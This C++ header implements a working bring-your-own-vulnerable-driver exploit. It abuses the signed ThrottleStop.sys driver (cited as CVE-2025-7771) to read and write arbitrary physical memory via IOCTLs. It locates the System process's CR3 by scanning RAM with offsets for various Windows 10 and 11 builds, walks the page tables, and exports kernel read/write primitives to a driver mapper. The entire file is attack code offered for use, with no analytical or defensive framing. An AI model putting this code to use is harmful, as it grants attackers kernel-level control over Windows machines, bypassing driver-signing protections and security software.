#pragma once
// primitive_ts.hpp
// ThrottleStop.sys BYOVD primitive (CVE-2025-7771, TechPowerUp ThrottleStop)
// Device: \\.\ThrottleStop
// Physical memory read/write via MmMapIoSpace — requires CR3 walk for virtual access.
// Legitimately signed by TechPowerUp — no test signing needed.

#include "mapper.hpp"
#include <Windows.h>
#include <cstdint>
#include <cstring>
#include <string>
#include <memory>
#include <algorithm>
#include <iostream>

#ifdef min
#undef min
#endif

static constexpr DWORD TS_IOCTL_READ_MEM  = 0x80006498;
static constexpr DWORD TS_IOCTL_WRITE_MEM = 0x8000649C;

// ── Physical memory read (1-8 bytes) ─────────────────────────
static bool TsPhysRead(HANDLE h, uint64_t pa, void* dst, uint32_t sz) {
    if (sz == 0 || sz > 8) return false;
    uint8_t buf[8] = {};
    DWORD got = 0;
    if (!DeviceIoControl(h, TS_IOCTL_READ_MEM,
                         &pa, sizeof(pa),
                         buf, sz, &got, nullptr))
        return false;
    if (got != sz) return false;
    memcpy(dst, buf, sz);
    return true;
}

// ── Physical memory write (1-8 bytes) ────────────────────────
static bool TsPhysWrite(HANDLE h, uint64_t pa, const void* src, uint32_t sz) {
    if (sz == 0 || sz > 8) return false;
    uint8_t input[16] = {};  // [8-byte PA][up to 8 bytes data]
    memcpy(input, &pa, 8);
    memcpy(input + 8, src, sz);
    DWORD got = 0;
    return DeviceIoControl(h, TS_IOCTL_WRITE_MEM,
                           input, 8 + sz,
                           nullptr, 0, &got, nullptr) != 0;
}

static uint64_t TsRead8(HANDLE h, uint64_t pa) {
    uint64_t v = 0;
    TsPhysRead(h, pa, &v, 8);
    return v;
}

// ── CR3 bootstrap: scan physical RAM for System EPROCESS ─────
// Win11 21H2-25H2 + Win10 2004-22H2: name=+0x5A8, pid=+0x440, cr3=+0x028
// Win10 1903/1909:                    name=+0x450, pid=+0x2E8, cr3=+0x028
// Win10 1703-1809:                    name=+0x450, pid=+0x2E0, cr3=+0x028
// Win10 1507-1607:                    name=+0x450, pid=+0x2E8, cr3=+0x028
struct TsEprocOff { uint32_t cr3, pid, name; };

static uint64_t TsBootstrapCR3(HANDLE h) {
    static const TsEprocOff offsets[] = {
        { 0x028, 0x440, 0x5A8 },  // Win10 2004+ / Win11 all
        { 0x028, 0x2E8, 0x450 },  // Win10 1903/1909, 1507-1607
        { 0x028, 0x2E0, 0x450 },  // Win10 1703-1809
    };

    for (auto& off : offsets) {
        for (uint64_t pa = 0x100000; pa < 0x80000000ULL; pa += 0x1000) {
            char name[8]{};
            TsPhysRead(h, pa + off.name, name, 6);
            if (memcmp(name, "System", 6) != 0) continue;

            uint64_t pid = 0;
            TsPhysRead(h, pa + off.pid, &pid, 8);
            if (pid != 4) continue;

            uint64_t cr3 = TsRead8(h, pa + off.cr3);
            if (!cr3 || (cr3 & 0xFFF) || cr3 > 0x100000000ULL) continue;

            return cr3;
        }
    }
    return 0;
}

// ── 4-level page table walk (PML4 → PDPT → PD → PT) ─────────
static uint64_t TsVirtToPhys(HANDLE h, uint64_t cr3, uint64_t va) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };

    uint64_t pml4e = TsRead8(h, (cr3 & ~0xFFFULL) + idx(39) * 8);
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte = TsRead8(h, (pml4e & ~0xFFFULL) + idx(30) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFF); // 1GB page

    uint64_t pde = TsRead8(h, (pdpte & ~0xFFFULL) + idx(21) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFF); // 2MB page

    uint64_t pte = TsRead8(h, (pde & ~0xFFFULL) + idx(12) * 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) | (va & 0xFFF); // 4KB page
}

// ── Virtual kernel R/W (handles cross-page spans) ────────────
static bool TsVirtRead(HANDLE h, uint64_t cr3, uint64_t va, void* dst, size_t n) {
    auto* d = (uint8_t*)dst;
    while (n) {
        uint64_t pa = TsVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        size_t off = 0;
        while (off + 4 <= chunk) {
            if (!TsPhysRead(h, pa + off, d + off, 4)) return false;
            off += 4;
        }
        while (off < chunk) {
            if (!TsPhysRead(h, pa + off, d + off, 1)) return false;
            off++;
        }
        va += chunk; d += chunk; n -= chunk;
    }
    return true;
}

static bool TsVirtWrite(HANDLE h, uint64_t cr3, uint64_t va, const void* src, size_t n) {
    const auto* s = (const uint8_t*)src;
    while (n) {
        uint64_t pa = TsVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        size_t off = 0;
        while (off + 4 <= chunk) {
            if (!TsPhysWrite(h, pa + off, s + off, 4)) return false;
            off += 4;
        }
        while (off < chunk) {
            if (!TsPhysWrite(h, pa + off, s + off, 1)) return false;
            off++;
        }
        va += chunk; s += chunk; n -= chunk;
    }
    return true;
}

// ── Session state ────────────────────────────────────────────
struct TsSession {
    HANDLE dev = INVALID_HANDLE_VALUE;
    uint64_t cr3 = 0;
};

// ── Open ThrottleStop device → KernelPrimitives ──────────────
inline KernelPrimitives OpenThrottleStop(std::string& err)
{
    HANDLE h = CreateFileW(L"\\\\.\\ThrottleStop",
                           GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        err = "OpenThrottleStop: CreateFile failed err=" + std::to_string(GetLastError()) +
              " (ThrottleStop service loaded?)";
        return {};
    }

    // Smoke test: read first physical page
    uint32_t smoke = 0;
    if (!TsPhysRead(h, 0x1000, &smoke, 4)) {
        CloseHandle(h);
        err = "OpenThrottleStop: smoke test read failed (IOCTL rejected)";
        return {};
    }

    uint64_t cr3 = TsBootstrapCR3(h);
    if (!cr3) {
        CloseHandle(h);
        err = "OpenThrottleStop: CR3 bootstrap failed (System EPROCESS not found)";
        return {};
    }

    std::cout << "[+] ThrottleStop opened, CR3=0x" << std::hex << cr3 << std::dec << "\n";

    auto sp = std::make_shared<TsSession>();
    sp->dev = h;
    sp->cr3 = cr3;

    KernelPrimitives p;

    p.ReadKernelMemory = [sp](void* dst, uint64_t src, size_t sz) -> bool {
        return TsVirtRead(sp->dev, sp->cr3, src, dst, sz);
    };

    p.WriteKernelMemory = [sp](uint64_t dst, const void* src, size_t sz) -> bool {
        return TsVirtWrite(sp->dev, sp->cr3, dst, src, sz);
    };

    p.AllocateKernelMemory = nullptr;  // filled by main

    return p;
}
